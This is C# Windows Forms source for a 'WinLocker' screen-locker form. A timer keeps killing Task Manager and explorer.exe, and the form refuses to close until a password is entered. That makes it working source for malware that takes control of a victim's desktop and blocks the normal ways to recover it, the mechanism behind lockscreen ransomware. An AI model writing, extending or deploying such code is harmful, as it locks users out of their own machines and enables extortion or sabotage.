using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
namespace WinLocker
{
    public partial class FrmLock : Form
    {
        bool pw = false;
        public FrmLock()
        {
            InitializeComponent();
        }

        private void FrmLock_Load(object sender, EventArgs e)
        {
            txtPW.Top = (this.Height - txtPW.Height + 400) / 2;
            txtPW.Left = (this.Width - txtPW.Width) / 2;
            lblLocked.Top = (this.Height - lblLocked.Height - 400) / 2;
            lblLocked.Left = (this.Width - lblLocked.Width) / 2;
        }

        private void TmrKill_Tick(object sender, EventArgs e)
        {
            foreach(Process process in Process.GetProcesses())
            {
                if (process.ProcessName.StartsWith("Taskmgr")) process.Kill();
                if (process.ProcessName.StartsWith("explorer")) Process.Start("taskkill", "/F /IM explorer.exe");
            }
        }

        private void TxtPW_TextChanged(object sender, EventArgs e)
        {
            if (txtPW.Text.Equals("****"))
            {
                pw = true;
                Process.Start("explorer");
                Application.Exit();
            }
        }


        private void FrmLock_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (!pw) { e.Cancel = true; }
        }
    }
}
